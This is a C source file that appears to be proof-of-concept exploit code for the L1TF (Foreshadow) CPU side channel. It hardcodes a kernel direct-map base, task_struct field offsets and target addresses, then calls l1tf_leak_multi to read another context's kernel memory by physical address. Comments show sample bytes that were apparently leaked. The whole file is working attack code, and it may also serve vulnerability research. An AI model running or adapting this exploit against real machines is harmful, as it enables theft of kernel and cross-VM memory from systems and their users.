#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"

#define direct_map 0xffff934040000000

uintptr_t pa(uintptr_t va) {
	uintptr_t p = va - direct_map;
	assert(p < (1ULL << 40));
	return p;
}

#define OFF_TASKS	0x900
#define OFF_PID_LINKS	0xa78
#define OFF_COMM	0xc38

	// 	+ 64	static_prio
	// 	+ 68	normal_prio
	// 	+ 6c	rt_priority
	// 	+900	tasks
	// 	+a78	pid_links
	// 	+c38	comm

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	uintptr_t base = 0x88d43f218; // l1tf_find_base();
	uintptr_t task_struct = 0xffff936a91dba000;



	// char comm[16];
	// comm[2] = 0xef;
	// // l1tf_leak(comm, base, pa(task_struct+OFF_COMM), 0x10);
	// display(comm, 0x10);

	// char tasks[0x40];
	// l1tf_leak(tasks, base, pa(task_struct+OFF_TASKS-0x10), 0x40);
	// display(tasks, 0x40);

	const int len_tasks_next = 0x20;
	char tasks_next[len_tasks_next];
	l1tf_leak_multi(tasks_next, base, pa(0xffff93416c014a80), len_tasks_next, 11);
	display(tasks_next, len_tasks_next);
	//  0:  ffff934214810a40   40 0a 81 14 42 93 ff ff @...B...
	//  8:  ffff93a1c66b2a80   80 2a 6b c6 a1 93 ff ff .*k.....
	// 10:       f00000f008c   8c 00 0f 00 00 0f 00 00 ........
	// 18:  ffff93416c014a98   98 4a 01 6c 41 93 ff ff .J.lA...


	// const int len = 0xc0;
	// char data[len];
	// l1tf_leak(data, base, pa(0xffff93416c014a80-OFF_TASKS), len);
	// display(data, len);

	return 0;
}
